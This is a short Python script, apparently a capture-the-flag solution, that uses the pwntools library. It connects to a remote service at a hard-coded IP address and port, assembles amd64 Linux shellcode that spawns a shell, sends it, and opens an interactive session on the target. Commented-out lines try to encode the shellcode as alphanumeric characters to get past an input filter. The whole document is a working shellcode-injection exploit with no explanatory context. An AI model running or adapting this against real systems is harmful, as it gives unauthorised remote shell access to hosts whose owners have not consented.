from pwn import *
context(arch = 'amd64', os = 'linux')
r = remote('155.69.144.206', 22803)
cmd = asm(shellcraft.sh())
# encoder.re_alphanumeric = r'[^A-Z0-9]'
# cmd = encoders.encoder.encode(cmd, expr=r'[^A-Z0-9]')
print(cmd)
r.send(cmd)
r.interactive()
